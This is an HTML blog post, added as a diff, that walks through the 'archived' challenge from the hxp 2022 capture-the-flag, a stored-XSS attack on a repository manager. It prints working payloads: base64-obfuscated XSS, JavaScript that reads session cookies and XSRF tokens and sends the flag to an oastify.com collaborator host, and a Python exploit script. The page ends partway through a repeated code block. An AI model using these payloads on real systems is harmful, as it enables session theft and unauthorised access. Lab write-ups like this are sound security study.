@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>archived - hxp 2022 | shafouz blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="archived - hxp 2022" />
+<meta name="author" content="shafouz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="chall: archived by sandr0 difficulty: easy description: I’m using this super secure big company open source software, what could go wrong?" />
+<meta property="og:description" content="chall: archived by sandr0 difficulty: easy description: I’m using this super secure big company open source software, what could go wrong?" />
+<link rel="canonical" href="https://shafouz.github.io/2023/03/19/archived.html" />
+<meta property="og:url" content="https://shafouz.github.io/2023/03/19/archived.html" />
+<meta property="og:site_name" content="shafouz blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-03-19T15:00:34+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="archived - hxp 2022" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"shafouz"},"dateModified":"2023-03-19T15:00:34+00:00","datePublished":"2023-03-19T15:00:34+00:00","description":"chall: archived by sandr0 difficulty: easy description: I’m using this super secure big company open source software, what could go wrong?","headline":"archived - hxp 2022","mainEntityOfPage":{"@type":"WebPage","@id":"https://shafouz.github.io/2023/03/19/archived.html"},"url":"https://shafouz.github.io/2023/03/19/archived.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://shafouz.github.io/feed.xml" title="shafouz blog" />
+<!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-F6L4J94HSJ"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-F6L4J94HSJ');
+  </script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">shafouz blog</a></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">archived - hxp 2022</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2023-03-19T15:00:34+00:00" itemprop="datePublished">
+        Mar 19, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <ul>
+  <li>chall: archived by sandr0</li>
+  <li>difficulty: easy</li>
+  <li>description: I’m using this super secure big company open source software, what could go wrong?</li>
+</ul>
+
+<p>Two credentials are provided, admin and regular user.</p>
+
+<p>The challenge consists of a server and an admin bot. So it is probably an XSS challenge.</p>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678982683162/e307cb1b-280d-4123-812f-d73e650b834f.png" alt="first look" /></p>
+
+<p>Right away this screen is giving me some old PHP website vibes so I log in, and look around a bit but nothing stands out. it just looks like some kind of repository manager.</p>
+
+<p>So I went googling for old vulns/writeups but there were none for the chall version. after that, I took a look at the provided files and found out that the admin bot visits the <code class="language-plaintext highlighter-rouge">/repository/internal</code> path</p>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678982758185/feb69fce-192a-4138-8faa-46569b5c7bbe.png" alt="directory listing" /></p>
+
+<p>This path looks like a directory listing. which is probably vulnerable to XSS.</p>
+
+<p>So how do we create an entry on this page? there are very limited options for a non-admin user.</p>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678982800504/f2288bb7-1847-4798-ad3e-89d1facc41f7.png" alt="artifacts panel" /></p>
+
+<p>Upload artifact stands out between the options there.</p>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678982825126/5456eb5c-6f7b-42de-a07e-5a0a09b6ee80.png" alt="upload form" /></p>
+
+<p>This page allows uploading files to one of the already existing repositories. in hindsight, I should probably test if I can upload some reverse shell but I kinda just tunnel-visioned on the XSS and after creating and uploading a file we can check that it is indeed vulnerable to XSS.</p>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678982873367/e8bc0277-f848-4ff1-a23a-98faf1710116.png" alt="alert popup" /></p>
+
+<p>So the exploit plan is:</p>
+
+<ul>
+  <li>
+    <p>create XSS payload through the upload page</p>
+  </li>
+  <li>
+    <p>get the admin cookie</p>
+  </li>
+  <li>
+    <p>???</p>
+  </li>
+</ul>
+
+<p>Thankfully the chall gives us an admin acc.</p>
+
+<p>The admin acc has a bunch of options but I just focused on the repository part.</p>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678982925604/796cf718-05e0-406a-9c9d-bd4607737b82.png" alt="admin options panel" /></p>
+
+<p>In the repository tab, the admin can add repositories and use a local path so if we set it to <code class="language-plaintext highlighter-rouge">/</code> we have access to the whole file system through the <code class="language-plaintext highlighter-rouge">/repository/:repo</code> endpoint</p>
+
+<p>so the exploit is now:</p>
+
+<ul>
+  <li>
+    <p>create XSS payload through the upload page</p>
+  </li>
+  <li>
+    <p>get admin cookie</p>
+  </li>
+  <li>
+    <p>create repo</p>
+  </li>
+  <li>
+    <p>get flag</p>
+  </li>
+</ul>
+
+<p>Making the exploit was kind of a struggle because I was trying to do the whole chain in javascript. The first problem was not able to add slashes. like in</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://localhost/something</span><span class="dl">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>I think this is a trivial problem for more experienced CTF players but I got stuck in this for a bit.</p>
+
+<p>I tried using base64 to add the payload and that worked although base64 can also have slashes. I then tried to include a base64url encode/decode to handle the slashes and I got a 500 error.</p>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678983041758/bf212cbc-ba8d-4987-9817-5bfe458683ea.png" alt="burp 500 error" /></p>
+
+<p>The problem was that if the path segment had more than 255 chars it wouldn’t work.</p>
+
+<p>big payload example that i was using:</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">http://localhost:8055/restServices/archivaUiServices/fileUploadService/save/internal/%22%3E%3Cimg%20onerror=%22fetch(atob('bGV0IGJvZHkgPSB7ImlkIjoibXlyZXBvIiwibmFtZSI6Im15cmVwbyIsImxheW91dCI6ImRlZmF1bHQiLCJsb2NhdGlvbiI6Ii8iLCJjcm9uRXhwcmVzc2lvbiI6IjAgMCAqICogKiA_Iiwic2Nhbm5lZCI6dHJ1ZSwic25hcHNob3RzIjpmYWxzZSwicmVsZWFzZXMiOmZhbHNlLCJibG9ja1JlZGVwbG95bWVudHMiOmZhbHNlLCJza2lwUGFja2VkSW5kZXhDcmVhdGlvbiI6ZmFsc2UsIm1vZGlmaWVkIjp0cnVlfTsKICBmZXRjaCgnaHR0cDovL2xvY2FsaG9zdDo4MDU1L3Jlc3RTZXJ2aWNlcy9hcmNoaXZhU2VydmljZXMvbWFuYWdlZFJlcG9zaXRvcmllc1NlcnZpY2UvYWRkTWFuYWdlZFJlcG9zaXRvcnknLCB7bWV0aG9kOiAnUE9TVCcsIGJvZHk6IGJvZHl9KTsKICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7CiAgICBmZXRjaCgnaHR0cDovL2xvY2FsaG9zdDo4MDU1L3JlcG9zaXRvcnkvbXlyZXBvL2ZsYWcudHh0JykKICB9LCA1MDAp'))%22%20src=%22x1678548818692%22%3E%3Cdiv%20id=%22x/2/1/1?_=1678542318133
+</span></code></pre></div></div>
+
+<p>After struggling a bit I remember that I can upload files to the server. so I wouldn’t need to have a big string on the path. I could just upload a js file and call the file from my XSS payload.</p>
+
+<p>This worked out and made me feel quite clever.</p>
+
+<p>You could choose where to upload the file since you controlled every path segment from <code class="language-plaintext highlighter-rouge">/repository/internal/js1/1/1/1-1.5.js</code> and to include the script file from the img tag I was using:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// base64:</span>
+<span class="c1">// import("./js1/1/1/1-1.5.js").then(s=&gt;{s.run("localhost:8055")});</span>
+<span class="nx">x</span><span class="dl">"</span><span class="s2">&gt;&lt;img%20src=</span><span class="dl">"</span><span class="nx">x</span><span class="dl">"</span><span class="s2">%20onerror=</span><span class="dl">"</span><span class="nx">javascript</span><span class="p">:</span><span class="nb">eval</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="dl">'</span><span class="s1">aW1wb3J0KCIuL2pzMS8xLzEvMS0xLjUuanMiKS50aGVuKHM9PntzLnJ1bigibG9jYWxob3N0OjgwNTUiKX0pOw</span><span class="dl">'</span><span class="p">))</span><span class="dl">"</span><span class="s2">&gt;
+</span></code></pre></div></div>
+
+<p>and the actual file:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="k">async</span> <span class="kd">function</span> <span class="nx">run</span><span class="p">()</span> <span class="p">{</span>
+  <span class="c1">// some js</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>so I tried doing the whole exploit chain on js but it wouldn’t work. for some reason, I could not create a repo that way. I keep getting a <code class="language-plaintext highlighter-rouge">TypeError: failed to fetch</code>. here is the whole chain file I used:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="kd">function</span> <span class="nx">run</span><span class="p">(</span><span class="nx">host</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">archiva</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">;</span><span class="dl">"</span><span class="p">).</span><span class="nx">filter</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">archiva</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">trim</span><span class="p">().</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">=</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="kd">let</span> <span class="nx">archiva_parsed</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">archiva</span><span class="p">))[</span><span class="dl">"</span><span class="s2">validationToken</span><span class="dl">"</span><span class="p">]</span>
+    <span class="kd">let</span> <span class="nx">session</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">;</span><span class="dl">"</span><span class="p">).</span><span class="nx">filter</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">JSESSION</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">trim</span><span class="p">()</span>
+
+    <span class="kd">let</span> <span class="nx">body</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+        <span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">myrepo</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">myrepo</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">layout</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">default</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">location</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">cronExpression</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0 0 * * * ?</span><span class="dl">"</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">scanned</span><span class="dl">"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">snapshots</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">releases</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">blockRedeployments</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">skipPackedIndexCreation</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">modified</span><span class="dl">"</span><span class="p">:</span> <span class="kc">true</span>
+    <span class="p">});</span>
+
+    <span class="nx">fetch</span><span class="p">(</span><span class="s2">`http://</span><span class="p">${</span><span class="nx">host</span><span class="p">}</span><span class="s2">/restServices/archivaServices/managedRepositoriesService/addManagedRepository`</span><span class="p">,</span> <span class="p">{</span>
+        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">body</span><span class="p">:</span> <span class="nx">body</span><span class="p">,</span>
+        <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
+        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
+            <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span><span class="p">,</span>
+            <span class="dl">"</span><span class="s2">X-XSRF-TOKEN</span><span class="dl">"</span><span class="p">:</span> <span class="nx">archiva_parsed</span>
+        <span class="p">}</span>
+    <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">_</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="nx">fetch</span><span class="p">(</span><span class="s2">`http://</span><span class="p">${</span><span class="nx">host</span><span class="p">}</span><span class="s2">/repository/myrepo/flag.txt`</span><span class="p">,</span> <span class="p">{</span>
+            <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span>
+            <span class="na">credentials</span><span class="p">:</span> <span class="dl">'</span><span class="s1">same-origin</span><span class="dl">'</span>
+        <span class="p">})</span>
+        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">flag</span> <span class="o">=&gt;</span> <span class="p">{</span>
+            <span class="nx">fetch</span><span class="p">(</span><span class="s2">`https://uxv39e6gvji5grql1rqnf9y3hunlbmzb.oastify.com/</span><span class="p">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">flag</span><span class="p">)}</span><span class="s2">`</span><span class="p">,</span> <span class="p">{</span>
+                <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span>
+                <span class="na">mode</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-cors</span><span class="dl">'</span>
+            <span class="p">})</span>
+          <span class="p">})</span>
+        <span class="p">})</span>
+    <span class="p">}).</span><span class="k">catch</span><span class="p">(</span><span class="nx">_</span> <span class="o">=&gt;</span> <span class="p">{});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This would work if I manually visited the page but not when the bot did for some reason that I could not figure out.</p>
+
+<p>After struggling with the whole chain for a bit i realized i just needed to get the admin <code class="language-plaintext highlighter-rouge">JSESSION</code> cookie. which I already had accomplished hours ago.</p>
+
+<p>so the exploit remained the same but I did the last 2 parts manually:</p>
+
+<ul>
+  <li>
+    <p>automated:</p>
+
+    <ul>
+      <li>
+        <p>create XSS payload through the upload page</p>
+      </li>
+      <li>
+        <p>call the admin bot</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>manually:</p>
+
+    <ul>
+      <li>get session</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678983785565/565d4cdf-459a-4a94-b84c-10ddfe5d49ce.png" alt="collaborator with admin session" /></p>
+
+<ul>
+  <li>create repo</li>
+</ul>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678983882393/8dc93eec-26e8-4851-b619-f1c1876ecff0.png" alt="admin create repo form" /></p>
+
+<ul>
+  <li>get flag</li>
+</ul>
+
+<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1678984215192/5e2c0bf9-9e5e-414e-9f87-b60be80684b8.png" alt="flag" /></p>
+
+<p>final exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s">"localhost:8055"</span>
+<span class="n">username</span> <span class="o">=</span> <span class="s">"hxp"</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s">"hxp"</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit.js"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="nb">file</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"Authorization"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"Basic </span><span class="si">{</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">((</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">username</span><span class="si">}:{</span><span class="n">password</span><span class="si">}</span><span class="s">').encode()).decode('</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="s">')</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+    <span class="s">"X-XSRF-TOKEN"</span><span class="p">:</span> <span class="s">"sWHpbHMVGUgrA36mnBa1oNs4Z5ceTqRDx9i0Syewr+Ox1WuPmor+thpwNKe9A/4CMHVsdslsRCbhdW+pq0Yvn9JG2OEFV4DDqyTr+7mJ4L6eLGQIOpGoonQl1Dl0yssLRQedjJh/XAwWKe6sk7Nu/rotn6hBBCeJ3gIrE4o5+tTQcw2Bfpzu/a+wr5xfb+cC9F+PesJbDmPlglFZivcMI+vEpZRpasZciJ/M8KD5fZZys5Vw9OnHik6ykGfxIXLhUiO5sKQ3HKjz56Qqq8s9LtKDWecEdWyOTkhZTCNiTk61s3XiqwxuiI9XmBob82VrqQKj8KxaFC3CkubWPwTq9Q=="</span><span class="p">,</span>
+    <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"application/json, text/javascript, */*; q=0.01"</span><span class="p">,</span>
+    <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36"</span><span class="p">,</span>
+    <span class="s">"Origin"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+<span class="p">}</span>
+
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"username"</span><span class="p">:</span> <span class="s">"ctf"</span><span class="p">,</span>
+        <span class="s">"password"</span><span class="p">:</span> <span class="s">"H4v3Fun"</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/restServices/redbackServices/loginService/logIn"</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+        <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">body</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">"Set-Cookie"</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">";"</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">"Set-Cookie"</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">";"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+
+<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"JSESSIONID"</span><span class="p">:</span> <span class="n">login</span><span class="p">(),</span>
+<span class="p">}</span>
+
+
+<span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/restServices/archivaUiServices/fileUploadService"</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"pomFile"</span><span class="p">:</span> <span class="s">"false"</span><span class="p">,</span>
+        <span class="s">"classifier"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span>
+        <span class="s">"packaging"</span><span class="p">:</span> <span class="s">""</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s">"files[]"</span><span class="p">:</span> <span class="p">(</span><span class="s">"blank.js"</span><span class="p">,</span> <span class="nb">file</span><span class="p">,</span> <span class="s">"text/javascript"</span><span class="p">)}</span>
+
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span>
+    <span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"upload: </span><span class="si">{</span> <span class="n">response</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">link_file</span><span class="p">():</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/restServices/archivaUiServices/fileUploadService/save/internal/js/1/1/1.js"</span><span class="p">,</span>
+        <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"link_file: </span><span class="si">{</span> <span class="n">response</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">xss</span><span class="p">():</span>
+    <span class="n">exploit</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s">"""import("./js/1/1/1-1.1.js").then(s=&gt;</span><span class="si">{</span><span class="n">s</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="s">"</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">")</span><span class="si">}</span><span class="s">);"""</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+    <span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s">"""http://</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/restServices/archivaUiServices/fileUploadService/save/internal/x"&gt;&lt;img%20src="x"%20onerror="javascript:eval(atob('</span><span class="si">{</span><span class="n">exploit</span><span class="si">}</span><span class="s">'))"&gt;/exploit/2/1"""</span><span class="p">,</span>
+        <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span>
+        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"xss: </span><span class="si">{</span> <span class="n">response</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+
+<span class="n">upload</span><span class="p">()</span>
+<span class="n">link_file</span><span class="p">()</span>
+<span class="n">upload</span><span class="p">()</span>
+<span class="n">xss</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="sa">f</span><span class="s">"""nc </span><span class="si">{</span><span class="n">host</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="si">:</span><span class="s">")[0]</span><span class="si">}</span><span class="s"> 9420"""</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+</code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">export</span> <span class="k">async</span> <span class="kd">function</span> <span class="nx">run</span><span class="p">(</span><span class="nx">host</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">archiva</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">;</span><span class="dl">"</span><span class="p">).</span><span class="nx">filter</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">archiva</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">trim</span><span class="p">().</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">=</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="kd">let</span> <span class="nx">archiva_parsed</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">archiva</span><span class="p">))[</span><span class="dl">"</span><span class="s2">validationToken</span><span class="dl">"</span><span class="p">]</span>
+    <span class="kd">let</span> <span class="nx">session</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">;</span><span class="dl">"</span><span class="p">).</span><span class="nx">filter</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">JSESSION</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">trim</span><span class="p">()</span>
+
+
